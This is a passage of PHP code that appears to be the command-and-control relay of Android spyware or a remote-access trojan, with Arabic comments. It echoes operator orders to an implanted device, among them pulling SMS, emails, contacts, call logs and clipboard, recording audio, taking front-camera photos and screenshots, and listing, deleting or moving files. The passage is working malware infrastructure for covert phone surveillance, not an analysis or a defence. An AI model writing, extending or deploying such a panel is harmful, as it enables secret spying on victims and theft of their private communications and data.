} elseif (strpos($order_content, "bg: ") === 0) {
    echo $order_content;
} elseif (strpos($order_content, "hz") === 0) {
    echo "hz";
} elseif (strpos($order_content, "inf") === 0) {
    echo "inf";
} elseif (strpos($order_content, "front") === 0) {
    echo "front";
} elseif (strpos($order_content, "selfi") === 0) {
    echo "selfi";
} elseif (strpos($order_content, "scr") === 0) {
    echo "scr";
} elseif (strpos($order_content, "con6") === 0) {
    echo "con6";
} elseif (strpos($order_content, "stop6") === 0) {
    echo "stop6";
} elseif (strpos($order_content, "bluetooth_on") === 0) {
    echo "bluetooth_on";
} elseif (strpos($order_content, "bluetooth_off") === 0) {
    echo "bluetooth_off";
} elseif (strpos($order_content, "sor6") === 0) {
    echo "sor6";
} elseif (strpos($order_content, "pull_messages") === 0) {
    echo "pull_messages";
} elseif (strpos($order_content, "pull_emails") === 0) {
    echo "pull_emails";
} elseif (strpos($order_content, "record") === 0) {
    echo "record";
} elseif (strpos($order_content, "ashar: ") === 0) {
    echo $order_content;
} elseif (strpos($order_content, "google: ") === 0) {
    echo $order_content;
} elseif (strpos($order_content, "pull_contacts") === 0) {
    echo "pull_contacts";
} elseif (strpos($order_content, "pull_outgoing_calls") === 0) {
    echo "pull_outgoing_calls";
} elseif (strpos($order_content, "dir: ") === 0) {
    echo "dir: " . $order_content;
} elseif (strpos($order_content, "file: ") === 0) {
    echo $order_content;
} elseif (strpos($order_content, "del: ") === 0) {
    echo $order_content;
} elseif (strpos($order_content, "pull_clipboard") === 0) {
    echo "pull_clipboard";
} elseif (strpos($order_content, "list_apps") === 0) {
    echo "list_apps";
} elseif (strpos($order_content, "open_app: ") === 0) {
    echo $order_content;
} elseif (strpos($order_content, "reboot_device") === 0) {
    echo "reboot_device";
} elseif (strpos($order_content, "sond: ") === 0) {
    echo $order_content;
}
// قراءة الأوامر الجديدة
elseif (strpos($order_content, "brightness: ") === 0) { // جديد
    echo $order_content;
} elseif (strpos($order_content, "clear_app_data: ") === 0) { // جديد
    echo $order_content;
} elseif (strpos($order_content, "rename: ") === 0) { // جديد
    echo $order_content;
} elseif (strpos($order_content, "move: ") === 0) { // جديد
    echo $order_content;
} elseif (strpos($order_content, "copy: ") === 0) { // جديد
    echo $order_content;
} elseif (strpos($order_content, "Non") === 0) { // أمر التحديث
    echo "Non";
}
?>
